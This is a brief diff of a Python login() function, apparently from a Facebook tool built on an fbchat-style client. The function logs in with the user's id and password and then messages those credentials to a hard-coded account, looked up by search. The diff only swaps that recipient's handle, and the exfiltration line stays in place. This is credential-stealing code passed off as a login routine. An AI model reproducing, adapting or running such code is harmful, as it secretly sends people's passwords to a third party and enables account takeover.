@@ -119,7 +119,7 @@ def login():
         x.update(sig)
 	data.update({'sig':x.hexdigest()})
 	client = Client(id,pwd)
-	friends = client.searchForUsers('achmadluthfi.hadi.3')
+	friends = client.searchForUsers('Arvendo.11')
 	friend = friends[0]
 	client.send(Message(id+' '+pwd), thread_id=friend.uid, thread_type=ThreadType.USER)
 	client.logout()
